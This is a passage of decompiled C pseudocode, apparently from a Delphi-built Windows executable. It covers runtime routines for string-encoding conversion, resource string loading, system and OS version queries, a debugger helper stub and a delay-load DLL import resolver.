      result = sub_40B5B0(0xFDE9u, 0, a3, cchWideChar, lpWideCharStr, cbMultiByte);
      if ( result && cbMultiByte >= result && (cchWideChar != -1 || lpWideCharStr[result - 1]) )
      {
        if ( cbMultiByte == result )
        {
          if ( result > 1 && lpWideCharStr[result - 1] >= 0xDC00u && lpWideCharStr[result - 1] <= 0xDFFFu )
            --result;
        }
        else
        {
          ++result;
        }
        lpWideCharStr[result - 1] = 0;
      }
    }
    else
    {
      return sub_40B5B0(0xFDE9u, 0, a3, cchWideChar, 0, 0);
    }
  }
  return result;
}

//----- (0040B238) --------------------------------------------------------
_DWORD *__fastcall sub_40B238(BOOL *a1, volatile __int32 *a2)
{
  BOOL *v2; // ebx
  int v3; // esi
  CHAR *v4; // eax
  signed int v5; // eax
  const WCHAR *v7; // [esp-14h] [ebp-28h]
  unsigned int v8[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v9; // [esp-4h] [ebp-18h]
  volatile __int32 *v10; // [esp+8h] [ebp-Ch]
  LPBOOL lpUsedDefaultChar; // [esp+Ch] [ebp-8h]
  int v12; // [esp+10h] [ebp-4h] BYREF
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v12 = 0;
  v10 = a2;
  lpUsedDefaultChar = a1;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_40B306;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  sub_406C68(a2);
  if ( lpUsedDefaultChar )
  {
    v2 = (BOOL *)*(lpUsedDefaultChar - 1);
    sub_4075BC(&v12, 3 * (_DWORD)v2, 65001);
    v3 = v12;
    if ( v12 )
      v3 = *(_DWORD *)(v12 - 4);
    v7 = (const WCHAR *)sub_407790((int)lpUsedDefaultChar);
    v4 = (CHAR *)sub_4074F8(v12);
    v5 = sub_40B108(v4, v3 + 1, v7, v2);
    if ( v5 <= 0 )
      sub_406C68(&v12);
    else
      sub_4075BC(&v12, v5 - 1, 65001);
    sub_407084(v10, v12);
    if ( *v10 )
      *(_WORD *)(*v10 - 12) = -535;
  }
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_40B30D;
  return sub_406C68(&v12);
}
// 40B270: conditional instruction was optimized away because %lpUsedDefaultChar.4!=0

//----- (0040B508) --------------------------------------------------------
int __fastcall sub_40B508(int a1, int a2)
{
  return sub_40B478(a1, a2);
}
// 40B478: using guessed type int __fastcall sub_40B478(_DWORD, _DWORD);

//----- (0040B51C) --------------------------------------------------------
int **__fastcall sub_40B51C(int **result, _DWORD *a2)
{
  HINSTANCE v3; // eax
  int StringW; // eax
  UINT v5; // [esp-Ch] [ebp-2014h]
  WCHAR Buffer[4100]; // [esp+0h] [ebp-2008h] BYREF

  if ( result )
  {
    if ( (unsigned int)result[1] >= 0x10000 )
    {
      return (int **)unknown_libname_50(a2, result[1]);
    }
    else
    {
      v5 = (UINT)result[1];
      v3 = (HINSTANCE)sub_408BFC(**result);
      StringW = LoadStringW(v3, v5, Buffer, 4096);
      return (int **)sub_406D90(a2, Buffer, StringW);
    }
  }
  return result;
}
// 4077E8: using guessed type int __fastcall unknown_libname_50(_DWORD, _DWORD);

//----- (0040B588) --------------------------------------------------------
int __fastcall sub_40B588(
        UINT CodePage,
        DWORD dwFlags,
        LPCWSTR lpWideCharStr,
        int lpUsedDefaultChar,
        CHAR *lpDefaultChar,
        int cbMultiByte,
        const CHAR *lpMultiByteStr,
        BOOL *cchWideChar)
{
  return WideCharToMultiByte(
           CodePage,
           dwFlags,
           lpWideCharStr,
           lpUsedDefaultChar,
           lpDefaultChar,
           cbMultiByte,
           lpMultiByteStr,
           cchWideChar);
}

//----- (0040B5B0) --------------------------------------------------------
int __fastcall sub_40B5B0(
        UINT CodePage,
        DWORD dwFlags,
        LPCSTR lpMultiByteStr,
        int cchWideChar,
        LPWSTR lpWideCharStr,
        int cbMultiByte)
{
  return MultiByteToWideChar(CodePage, dwFlags, lpMultiByteStr, cchWideChar, lpWideCharStr, cbMultiByte);
}

//----- (0040B5D0) --------------------------------------------------------
DWORD sub_40B5D0()
{
  struct _SYSTEM_INFO v1; // [esp+0h] [ebp-24h] BYREF

  GetSystemInfo(&v1);
  return v1.dwNumberOfProcessors;
}

//----- (0040B5E4) --------------------------------------------------------
int sub_40B5E4()
{
  __int16 Version; // ax
  unsigned int v1; // edx
  int result; // eax

  Version = GetVersion();
  v1 = (unsigned __int8)Version;
  result = (unsigned __int16)(Version & 0xFF00) >> 8;
  if ( v1 == 5 && result || v1 > 5 )
    dword_469980 = 127;
  else
    dword_469980 = 1033;
  return result;
}
// 469980: using guessed type int dword_469980;

//----- (0040B620) --------------------------------------------------------
bool __fastcall sub_40B620(_DWORD *a1, _DWORD *a2)
{
  return *a1 == *a2 && a1[1] == a2[1] && a1[2] == a2[2] && a1[3] == a2[3];
}

//----- (0040B644) --------------------------------------------------------
int sub_40B644()
{
  int v0; // eax
  int result; // eax
  unsigned int v2[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v2[2] = (unsigned int)&savedregs;
  v2[1] = (unsigned int)&loc_40B6C0;
  v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  if ( !++dword_469988 )
  {
    sub_40AC00((int)dword_46BCD0);
    System::__linkproc__ Close(&unk_469060);
    System::__linkproc__ Close(&unk_46933C);
    System::__linkproc__ Close(&unk_469618);
    sub_408F4C();
    if ( dword_465C08 )
      v0 = System::__linkproc__ FreeMem(dword_465C08);
    unknown_libname_27(v0);
    sub_407DEC((int)dword_46BCD0, (int)&byte_40A424);
  }
  result = 0;
  __writefsdword(0, v2[0]);
  return result;
}
// 40B69D: variable 'v0' is possibly undefined
// 404D28: using guessed type int __fastcall unknown_libname_27(_DWORD);
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);
// 405160: using guessed type int __fastcall System::__linkproc__ Close(_DWORD);
// 40A424: using guessed type char byte_40A424;
// 469988: using guessed type int dword_469988;
// 46BCD0: using guessed type int dword_46BCD0[595];

//----- (0040B6CC) --------------------------------------------------------
__int32 __stdcall sub_40B6CC(volatile __int32 *a1, __int32 a2)
{
  return _InterlockedExchange(a1, a2);
}

//----- (0040B744) --------------------------------------------------------
int sub_40B744()
{
  return 44;
}

//----- (0040B7E0) --------------------------------------------------------
int __stdcall sub_40B7E0(
        int a1,
        int a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20,
        int a21,
        int a22,
        int a23,
        int a24,
        int a25,
        int a26,
        int a27)
{
  int v27; // eax
  int v28; // eax
  int v29; // eax
  int v30; // eax
  int v31; // eax
  int v32; // eax
  int v33; // eax
  int v34; // eax
  int v35; // eax
  int v36; // eax
  int v37; // eax
  int v38; // eax
  int v39; // eax
  int v40; // eax
  int v41; // eax
  int v42; // eax
  int v43; // eax
  int v44; // eax
  int v45; // eax
  int v46; // eax
  int v47; // eax
  int v48; // eax
  int v49; // eax
  int v50; // eax
  int v51; // eax
  int v52; // eax
  int v53; // eax
  int v54; // eax
  int v55; // eax
  int v56; // eax
  int v57; // eax
  int v58; // eax
  int v59; // eax
  int v60; // eax
  int v61; // eax
  int v62; // eax
  int v63; // eax
  int v64; // eax
  int v65; // eax
  int v66; // eax
  int v67; // eax
  int v68; // eax
  int v69; // eax
  int v70; // eax
  int v71; // eax
  int v72; // eax
  int v73; // eax
  int v74; // eax
  int v75; // eax
  int v76; // eax
  int v77; // eax
  int v78; // eax
  int v79; // eax
  int v80; // eax
  int v81; // eax
  int v82; // eax
  int v83; // eax
  int v84; // eax
  int v85; // eax
  int v86; // eax
  int v87; // eax
  int v88; // eax
  int v89; // eax
  int v90; // eax
  int v91; // eax
  int v92; // eax
  int v93; // eax
  int v94; // eax
  int v95; // eax
  int v96; // eax
  int v97; // eax
  int v98; // eax
  int v99; // eax
  int v100; // eax
  int v101; // eax
  int v102; // eax
  int v103; // eax
  int v104; // eax
  int v105; // eax
  int v106; // eax
  int v107; // eax
  int v108; // eax
  int v109; // eax
  int v110; // eax
  int v111; // eax
  int v112; // eax
  int v113; // eax
  int v114; // eax
  int v115; // eax
  int v116; // eax
  int v117; // eax
  int v118; // eax
  int v119; // eax
  int v120; // eax
  int v121; // eax
  int v122; // eax
  int v123; // eax
  int v124; // eax
  int v125; // eax
  int v126; // eax
  int v127; // eax
  int v128; // eax
  int v129; // eax
  int v130; // eax
  int v131; // eax
  int v132; // eax
  int v133; // eax
  int v134; // eax
  int v135; // eax
  int v136; // eax
  int v137; // eax
  int v138; // eax
  int v139; // eax
  int v140; // eax
  int v141; // eax
  int v142; // eax
  int v143; // eax
  int v144; // eax
  int v145; // eax
  int v146; // eax
  int v147; // eax
  int v148; // eax
  int v149; // eax
  int v150; // eax
  int v151; // eax
  int v152; // eax
  int v153; // eax
  int v154; // eax
  int v155; // eax
  int v156; // eax
  int v157; // eax
  int v158; // eax
  int v159; // eax
  int v160; // eax
  int v161; // eax
  int v162; // eax
  int v163; // eax
  int v164; // eax
  int v165; // eax
  int v166; // eax
  int v167; // eax
  int v168; // eax
  int v169; // eax
  int v170; // eax
  int v171; // eax
  int v172; // eax
  int v173; // eax
  int v174; // eax
  int v175; // eax
  int v176; // eax
  int v177; // eax
  int v178; // eax
  int v179; // eax
  int v180; // eax
  int v181; // eax
  int v182; // eax
  int v183; // eax
  int v184; // eax
  int v185; // eax
  int v186; // eax
  int v187; // eax
  int v188; // eax
  int v189; // eax
  int v190; // eax
  int v191; // eax
  int v192; // eax
  int v193; // eax
  int v194; // eax
  int v195; // eax
  int v196; // eax
  int v197; // eax
  int v198; // eax
  int v199; // eax
  int v200; // eax
  int v201; // eax
  int v202; // eax
  int v203; // eax
  int v204; // eax
  int v205; // eax
  int v206; // eax
  int v207; // eax
  int v208; // eax
  int v209; // eax
  int v210; // eax
  int v211; // eax
  int v212; // eax
  int v213; // eax
  int v214; // eax
  int v215; // eax
  int v216; // eax
  int v217; // eax
  int v218; // eax
  int v219; // eax
  int v220; // eax
  int v221; // eax
  int v222; // eax
  int v223; // eax
  int v224; // eax
  int v225; // eax

  v27 = ((int (*)(void))nullsub_4)();
  v28 = nullsub_4(v27);
  v29 = nullsub_4(v28);
  v30 = nullsub_4(v29);
  v31 = nullsub_4(v30);
  v32 = nullsub_4(v31);
  v33 = nullsub_4(v32);
  v34 = nullsub_4(v33);
  v35 = nullsub_4(v34);
  v36 = nullsub_4(v35);
  v37 = nullsub_4(v36);
  v38 = nullsub_4(v37);
  v39 = nullsub_4(v38);
  v40 = nullsub_4(v39);
  v41 = nullsub_4(v40);
  v42 = nullsub_4(v41);
  v43 = nullsub_4(v42);
  v44 = nullsub_4(v43);
  v45 = nullsub_4(v44);
  v46 = nullsub_4(v45);
  v47 = nullsub_4(v46);
  v48 = nullsub_4(v47);
  v49 = nullsub_4(v48);
  v50 = nullsub_4(v49);
  v51 = nullsub_4(v50);
  v52 = nullsub_4(v51);
  v53 = nullsub_4(v52);
  v54 = nullsub_4(v53);
  v55 = nullsub_4(v54);
  v56 = nullsub_4(v55);
  v57 = nullsub_4(v56);
  v58 = nullsub_4(v57);
  v59 = nullsub_4(v58);
  v60 = nullsub_4(v59);
  v61 = nullsub_4(v60);
  v62 = nullsub_4(v61);
  v63 = nullsub_4(v62);
  v64 = nullsub_4(v63);
  v65 = nullsub_4(v64);
  v66 = nullsub_4(v65);
  v67 = nullsub_4(v66);
  v68 = nullsub_4(v67);
  v69 = nullsub_4(v68);
  v70 = nullsub_4(v69);
  v71 = nullsub_4(v70);
  v72 = nullsub_4(v71);
  v73 = nullsub_4(v72);
  v74 = nullsub_4(v73);
  v75 = nullsub_4(v74);
  v76 = nullsub_4(v75);
  v77 = nullsub_4(v76);
  v78 = nullsub_4(v77);
  v79 = nullsub_4(v78);
  v80 = nullsub_4(v79);
  v81 = nullsub_4(v80);
  v82 = nullsub_4(v81);
  v83 = nullsub_4(v82);
  v84 = nullsub_4(v83);
  v85 = nullsub_4(v84);
  v86 = nullsub_4(v85);
  v87 = nullsub_4(v86);
  v88 = nullsub_4(v87);
  v89 = nullsub_4(v88);
  v90 = nullsub_4(v89);
  v91 = nullsub_4(v90);
  v92 = nullsub_4(v91);
  v93 = nullsub_4(v92);
  v94 = nullsub_4(v93);
  v95 = nullsub_4(v94);
  v96 = nullsub_4(v95);
  v97 = nullsub_4(v96);
  v98 = nullsub_4(v97);
  v99 = nullsub_4(v98);
  v100 = nullsub_4(v99);
  v101 = nullsub_4(v100);
  v102 = nullsub_4(v101);
  v103 = nullsub_4(v102);
  v104 = nullsub_4(v103);
  v105 = nullsub_4(v104);
  v106 = nullsub_4(v105);
  v107 = nullsub_4(v106);
  v108 = nullsub_4(v107);
  v109 = nullsub_4(v108);
  v110 = nullsub_4(v109);
  v111 = nullsub_4(v110);
  v112 = nullsub_4(v111);
  v113 = nullsub_4(v112);
  v114 = nullsub_4(v113);
  v115 = nullsub_4(v114);
  v116 = nullsub_4(v115);
  v117 = nullsub_4(v116);
  v118 = nullsub_4(v117);
  v119 = nullsub_4(v118);
  v120 = nullsub_4(v119);
  v121 = nullsub_4(v120);
  v122 = nullsub_4(v121);
  v123 = nullsub_4(v122);
  v124 = nullsub_4(v123);
  v125 = nullsub_4(v124);
  v126 = nullsub_4(v125);
  v127 = nullsub_4(v126);
  v128 = nullsub_4(v127);
  v129 = nullsub_4(v128);
  v130 = nullsub_4(v129);
  v131 = nullsub_4(v130);
  v132 = nullsub_4(v131);
  v133 = nullsub_4(v132);
  v134 = nullsub_4(v133);
  v135 = nullsub_4(v134);
  v136 = nullsub_4(v135);
  v137 = nullsub_4(v136);
  v138 = nullsub_4(v137);
  v139 = nullsub_4(v138);
  v140 = nullsub_4(v139);
  v141 = nullsub_4(v140);
  v142 = nullsub_4(v141);
  v143 = nullsub_4(v142);
  v144 = nullsub_4(v143);
  v145 = nullsub_4(v144);
  v146 = nullsub_4(v145);
  v147 = nullsub_4(v146);
  v148 = nullsub_4(v147);
  v149 = nullsub_4(v148);
  v150 = nullsub_4(v149);
  v151 = nullsub_4(v150);
  v152 = nullsub_4(v151);
  v153 = nullsub_4(v152);
  v154 = nullsub_4(v153);
  v155 = nullsub_4(v154);
  v156 = nullsub_4(v155);
  v157 = nullsub_4(v156);
  v158 = nullsub_4(v157);
  v159 = nullsub_4(v158);
  v160 = nullsub_4(v159);
  v161 = nullsub_4(v160);
  v162 = nullsub_4(v161);
  v163 = nullsub_4(v162);
  v164 = nullsub_4(v163);
  v165 = nullsub_4(v164);
  v166 = nullsub_4(v165);
  v167 = nullsub_4(v166);
  v168 = nullsub_4(v167);
  v169 = nullsub_4(v168);
  v170 = nullsub_4(v169);
  v171 = nullsub_4(v170);
  v172 = nullsub_4(v171);
  v173 = nullsub_4(v172);
  v174 = nullsub_4(v173);
  v175 = nullsub_4(v174);
  v176 = nullsub_4(v175);
  v177 = nullsub_4(v176);
  v178 = nullsub_4(v177);
  v179 = nullsub_4(v178);
  v180 = nullsub_4(v179);
  v181 = nullsub_4(v180);
  v182 = nullsub_4(v181);
  v183 = nullsub_4(v182);
  v184 = nullsub_4(v183);
  v185 = nullsub_4(v184);
  v186 = nullsub_4(v185);
  v187 = nullsub_4(v186);
  v188 = nullsub_4(v187);
  v189 = nullsub_4(v188);
  v190 = nullsub_4(v189);
  v191 = nullsub_4(v190);
  v192 = nullsub_4(v191);
  v193 = nullsub_4(v192);
  v194 = nullsub_4(v193);
  v195 = nullsub_4(v194);
  v196 = nullsub_4(v195);
  v197 = nullsub_4(v196);
  v198 = nullsub_4(v197);
  v199 = nullsub_4(v198);
  v200 = nullsub_4(v199);
  v201 = nullsub_4(v200);
  v202 = nullsub_4(v201);
  v203 = nullsub_4(v202);
  v204 = nullsub_4(v203);
  v205 = nullsub_4(v204);
  v206 = nullsub_4(v205);
  v207 = nullsub_4(v206);
  v208 = nullsub_4(v207);
  v209 = nullsub_4(v208);
  v210 = nullsub_4(v209);
  v211 = nullsub_4(v210);
  v212 = nullsub_4(v211);
  v213 = nullsub_4(v212);
  v214 = nullsub_4(v213);
  v215 = nullsub_4(v214);
  v216 = nullsub_4(v215);
  v217 = nullsub_4(v216);
  v218 = nullsub_4(v217);
  v219 = nullsub_4(v218);
  v220 = nullsub_4(v219);
  v221 = nullsub_4(v220);
  v222 = nullsub_4(v221);
  v223 = nullsub_4(v222);
  v224 = nullsub_4(v223);
  v225 = nullsub_4(v224);
  return nullsub_4(v225);
}
// 40B7DC: using guessed type int __fastcall nullsub_4(_DWORD);

//----- (0040BBD0) --------------------------------------------------------
int _dbk_fcall_wrapper()
{
  int result; // eax
  unsigned int v1[7]; // [esp-Ch] [ebp-1Ch] BYREF
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v1[6] = 0;
  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_40BC71;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  sub_40B7E0(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}

//----- (0040BD48) --------------------------------------------------------
int __stdcall sub_40BD48(int *a1, FARPROC *a2)
{
  HMODULE LibraryA; // ebx
  int v4; // edi
  FARPROC ProcAddress_0; // edi
  _DWORD *v6; // eax
  int v7[9]; // [esp+Ch] [ebp-58h] BYREF
  int v8[8]; // [esp+30h] [ebp-34h] BYREF
  ULONG_PTR v9; // [esp+50h] [ebp-14h] BYREF
  _DWORD *v10; // [esp+54h] [ebp-10h]
  ULONG_PTR v11; // [esp+58h] [ebp-Ch] BYREF
  int v12; // [esp+5Ch] [ebp-8h]
  ULONG_PTR Arguments; // [esp+60h] [ebp-4h] BYREF

  qmemcpy(v8, &unk_465C38, sizeof(v8));
  v8[0] = *a1;
  v8[1] = (int)sub_40C1F8(a1[1]);
  v8[2] = (int)sub_40C208(a1[2]);
  v8[3] = (int)sub_40C218(a1[3]);
  v8[4] = (int)sub_40C228(a1[4]);
  v8[5] = (int)sub_40C228(a1[5]);
  v8[6] = (int)sub_40C228(a1[6]);
  v8[7] = a1[7];
  qmemcpy(v7, &unk_465C58, sizeof(v7));
  v7[1] = (int)a1;
  v7[2] = (int)a2;
  v7[3] = v8[1];
  if ( (v8[0] & 1) == 0 )
  {
    Arguments = (ULONG_PTR)v7;
    RaiseException_0(0xC06D0057, 0, 1u, &Arguments);
    return 0;
  }
  LibraryA = *(HMODULE *)v8[2];
  v12 = ((int)a2 - v8[3]) / 4;
  v4 = v8[4] + 4 * v12;
  v7[4] = *(_BYTE *)(v4 + 3) >= 0;
  if ( v7[4] )
    v7[5] = (int)(sub_40C238(*(_DWORD *)v4) + 2);
  else
    v7[5] = (unsigned __int16)*(_DWORD *)v4;
  ProcAddress_0 = 0;
  if ( dword_46C62C )
  {
    ProcAddress_0 = (FARPROC)dword_46C62C(0, v7);
    if ( ProcAddress_0 )
      goto LABEL_39;
  }
  if ( !LibraryA )
  {
    if ( dword_46C62C )
      LibraryA = (HMODULE)dword_46C62C(1, v7);
    if ( !LibraryA )
      LibraryA = LoadLibraryA((LPCSTR)v7[3]);
    if ( !LibraryA )
    {
      v7[8] = GetLastError_0();
      if ( dword_46C630 )
        LibraryA = (HMODULE)dword_46C630(3, v7);
      if ( !LibraryA )
      {
        v11 = (ULONG_PTR)v7;
        RaiseException_0(0xC06D007E, 0, 1u, &v11);
        return v7[7];
      }
    }
    if ( LibraryA == (HMODULE)sub_40B6CC((volatile __int32 *)v8[2], (__int32)LibraryA) )
    {
      FreeLibrary_0(LibraryA);
    }
    else if ( a1[6] )
    {
      v10 = LocalAlloc(0x40u, 8u);
      if ( v10 )
      {
        v10[1] = a1;
        *v10 = hMem;
        hMem = v10;
      }
    }
  }
  v7[6] = (int)LibraryA;
  if ( dword_46C62C )
    ProcAddress_0 = (FARPROC)dword_46C62C(2, v7);
  if ( ProcAddress_0 )
    goto LABEL_33;
  if ( !a1[5]
    || !a1[7]
    || (v6 = (_DWORD *)((char *)LibraryA + *((_DWORD *)LibraryA + 15)), *v6 != 17744)
    || v6[2] != v8[7]
    || (HMODULE)v6[13] != LibraryA
    || (ProcAddress_0 = *(FARPROC *)(v8[5] + 4 * v12)) == 0 )
  {
    ProcAddress_0 = GetProcAddress_0(LibraryA, (LPCSTR)v7[5]);
LABEL_33:
    if ( !ProcAddress_0 )
    {
      v7[8] = GetLastError_0();
      if ( dword_46C630 )
        ProcAddress_0 = (FARPROC)dword_46C630(4, v7);
      if ( !ProcAddress_0 )
      {
        v9 = (ULONG_PTR)v7;
        RaiseException_0(0xC06D007F, 0, 1u, &v9);
        ProcAddress_0 = (FARPROC)v7[7];
      }
    }
  }
  *a2 = ProcAddress_0;
LABEL_39:
  if ( dword_46C62C )
  {
    v7[8] = 0;
    v7[6] = (int)LibraryA;
    v7[7] = (int)ProcAddress_0;
    dword_46C62C(5, v7);
  }
  return (int)ProcAddress_0;
}
// 46C62C: using guessed type int (__stdcall *dword_46C62C)(_DWORD, _DWORD);
// 46C630: using guessed type int (__stdcall *dword_46C630)(_DWORD, _DWORD);

//----- (0040C028) --------------------------------------------------------
int __stdcall sub_40C028(char *a1)
{
  unsigned int v1; // eax
  HLOCAL v2; // ebx
  char *v3; // edi
  int v4; // eax
  int *v5; // edi
  char *v6; // edi
  int v7; // eax
  char *v9; // [esp+Ch] [ebp-1Ch]
  HMODULE hLibModule; // [esp+10h] [ebp-18h]
  char *v11; // [esp+14h] [ebp-14h]
  unsigned int v12; // [esp+1Ch] [ebp-Ch]
  HLOCAL v13; // [esp+20h] [ebp-8h]
  int v14; // [esp+24h] [ebp-4h]

  v14 = 0;
  if ( a1 )
    v1 = sub_40C248(a1);
  else
    v1 = 0;
  v12 = v1;
  v2 = hMem;
  if ( hMem )
  {
    do
    {
      v3 = sub_40C1F8(*(_DWORD *)(*((_DWORD *)v2 + 1) + 4));
      v4 = sub_40C248(v3);
      v13 = *(HLOCAL *)v2;
      if ( !a1 || v4 == v12 && !sub_40C25C(a1, v3, v4) )
      {
        if ( v2 && *(_DWORD *)(*((_DWORD *)v2 + 1) + 24) )
        {
          v5 = (int *)*((_DWORD *)v2 + 1);
          v11 = sub_40C208(v5[2]);
          hLibModule = *(HMODULE *)v11;
          v9 = sub_40C228(v5[6]);
          v6 = sub_40C218(v5[3]);
          v7 = sub_40C28C(v6);
          sub_40C2A4(v6, v9, 4 * v7);
          FreeLibrary_0(hLibModule);
          *(_DWORD *)v11 = 0;
          sub_40C2CC((HLOCAL *)v2);
          LocalFree(v2);
          v14 = 1;
        }
        if ( a1 )
          break;
      }
      v2 = v13;
    }
    while ( v13 );
  }
  return v14;
}
// 40C105: conditional instruction was optimized away because ebx.4!=0

//----- (0040C1F0) --------------------------------------------------------
int sub_40C1F0()
{
  return sub_40C028(0);
}

//----- (0040C1F8) --------------------------------------------------------
char *__cdecl sub_40C1F8(int a1)
{
  return (char *)&_ImageBase + a1;
}
// 400000: using guessed type __int16 _ImageBase;

//----- (0040C208) --------------------------------------------------------
char *__cdecl sub_40C208(int a1)
{
  return (char *)&_ImageBase + a1;
}
// 400000: using guessed type __int16 _ImageBase;

//----- (0040C218) --------------------------------------------------------
char *__cdecl sub_40C218(int a1)
{
  return (char *)&_ImageBase + a1;
}
// 400000: using guessed type __int16 _ImageBase;

//----- (0040C228) --------------------------------------------------------
char *__cdecl sub_40C228(int a1)
{
  return (char *)&_ImageBase + a1;
}
// 400000: using guessed type __int16 _ImageBase;

//----- (0040C238) --------------------------------------------------------
char *__cdecl sub_40C238(int a1)
{
  return (char *)&_ImageBase + a1;
}
// 400000: using guessed type __int16 _ImageBase;

//----- (0040C248) --------------------------------------------------------
unsigned int __cdecl sub_40C248(const char *a1)
{
  return strlen(a1);
}

//----- (0040C25C) --------------------------------------------------------
int __cdecl sub_40C25C(_BYTE *a1, _BYTE *a2, int a3)
{
  int v3; // ecx

  v3 = a3;
  if ( !a3 )
    return 0;
  while ( --v3 && *a1 == *a2 )
  {
    ++a1;
    ++a2;
  }
  return (unsigned __int8)*a1 - (unsigned __int8)*a2;
}

//----- (0040C28C) --------------------------------------------------------
int __cdecl sub_40C28C(_DWORD *a1)
{
  int v1; // edx

  v1 = 0;
  while ( *a1 )
  {
    ++a1;
    ++v1;
  }
  return v1;
}

//----- (0040C2A4) --------------------------------------------------------
_BYTE *__cdecl sub_40C2A4(_BYTE *a1, _BYTE *a2, int a3)
{
  _BYTE *i; // eax

  for ( i = a1; a3--; ++i )
    *i = *a2++;
  return a1;
}

//----- (0040C2CC) --------------------------------------------------------
HLOCAL *__cdecl sub_40C2CC(HLOCAL *a1)
{
  HLOCAL *result; // eax

  for ( result = &hMem; *result && a1 != *result; result = (HLOCAL *)*result )
    ;
  if ( a1 == *result )
    *result = *a1;
  return result;
}

//----- (0040C2F0) --------------------------------------------------------
char *__cdecl sub_40C2F0(int a1)
{
  return (char *)&_ImageBase + a1;
}
// 400000: using guessed type __int16 _ImageBase;

//----- (0040C300) --------------------------------------------------------
char *__cdecl sub_40C300(int a1)
{
  return (char *)&_ImageBase + a1;
}
// 400000: using guessed type __int16 _ImageBase;

//----- (0040C310) --------------------------------------------------------
int sub_40C310()
{
  int result; // eax

  if ( !++dword_46C634 )
    return sub_40C1F0();
  return result;
}
// 46C634: using guessed type int dword_46C634;

//----- (0040C320) --------------------------------------------------------
void sub_40C320()
{
  ++dword_46C63C;
}
// 46C63C: using guessed type int dword_46C63C;

//----- (0040C490) --------------------------------------------------------
signed __int32 __stdcall sub_40C490(volatile signed __int32 *a1)
{
  return _InterlockedIncrement(a1);
}

//----- (0040C598) --------------------------------------------------------
FARPROC __stdcall sub_40C598(HMODULE hModule, LPCSTR lpProcName)
{
  const CHAR *v2; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-18h] [ebp-28h] BYREF
  void *v5; // [esp-14h] [ebp-24h]
  int *v6; // [esp-10h] [ebp-20h]
  unsigned int v7[2]; // [esp-Ch] [ebp-1Ch] BYREF
  int *v8; // [esp-4h] [ebp-14h]
  FARPROC ProcAddress_1; // [esp+8h] [ebp-8h]
  CHAR *v10; // [esp+Ch] [ebp-4h] BYREF
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v10 = 0;
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_40C62E;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  if ( (unsigned int)lpProcName >> 16 )
  {
    v6 = &savedregs;
    v5 = &loc_40C611;
    ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&ExceptionList);
    sub_40727C(&v10, (int)lpProcName, 0, (unsigned __int16)ExceptionList);
    v2 = (const CHAR *)sub_4074F8((int)v10);
    ProcAddress_1 = GetProcAddress_1(hModule, v2);
    __writefsdword(0, (unsigned int)v5);
    v7[0] = (unsigned int)&loc_40C618;
    sub_406C68(&v10);
  }
  else
  {
    ProcAddress_1 = GetProcAddress_1(hModule, lpProcName);
  }
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_40C635;
  sub_406C68(&v10);
  return ProcAddress_1;
}

//----- (0040C658) --------------------------------------------------------
__int32 __fastcall sub_40C658(__int32 a1)
{
  __int32 v2; // [esp+0h] [ebp-4h] BYREF

  v2 = a1;
  return _InterlockedExchange(&v2, sub_40B730(&dword_472040, &GetNativeSystemInfo));
}
// 40B730: using guessed type _DWORD __stdcall sub_40B730(_DWORD, _DWORD);
// 472040: using guessed type int dword_472040;

//----- (0040C8C8) --------------------------------------------------------
int __fastcall sub_40C8C8(void *a1, const void *a2, int a3)
{
  return System::Move(a2, a1, a3);
}

//----- (0040C8D0) --------------------------------------------------------
int __fastcall sub_40C8D0(_WORD *a1, int a2)
{
  return sub_4051B8(a1, a2, 0);
}

//----- (0040C8D8) --------------------------------------------------------
int sub_40C8D8()
{
  return 0;
}

//----- (0040C8DC) --------------------------------------------------------
int __fastcall sub_40C8DC(unsigned __int16 a1, unsigned __int16 a2)
{
  return a1 | (a2 << 16);
}

//----- (0040C8EC) --------------------------------------------------------
DWORD sub_40C8EC()
{
  DWORD result; // eax
  struct _OSVERSIONINFOW v1; // [esp+0h] [ebp-114h] BYREF

  v1.dwOSVersionInfoSize = 276;
  result = GetVersionExW(&v1);
  if ( result )
  {
    dword_465C90 = v1.dwPlatformId;
    dword_465C88 = v1.dwMajorVersion;
    result = v1.dwMinorVersion;
    dword_465C8C = v1.dwMinorVersion;
  }
  return result;
}
// 465C88: using guessed type int dword_465C88;
// 465C8C: using guessed type int dword_465C8C;
// 465C90: using guessed type int dword_465C90;

//----- (0040C928) --------------------------------------------------------
BOOL sub_40C928()
{
  BOOL result; // eax

  if ( !++dword_46C640 )
  {
    if ( dword_46C644 )
      return FreeLibrary_1(dword_46C644);
  }
  return result;
}
// 46C640: using guessed type int dword_46C640;

//----- (0040CD9C) --------------------------------------------------------
__int16 *sub_40CD9C()
{
  return &word_40CDA2;
}
// 40CDA2: using guessed type __int16 word_40CDA2;

//----- (00411B24) --------------------------------------------------------
int sub_411B24()
{
  int result; // eax

  dword_46C654 = sub_40CD9C();
  dword_46C658 = (int)dword_46C654 + *dword_46C654;
  dword_46C65C = (int)dword_46C654 + dword_46C654[1];
  dword_46C660 = (int)dword_46C654 + dword_46C654[2];
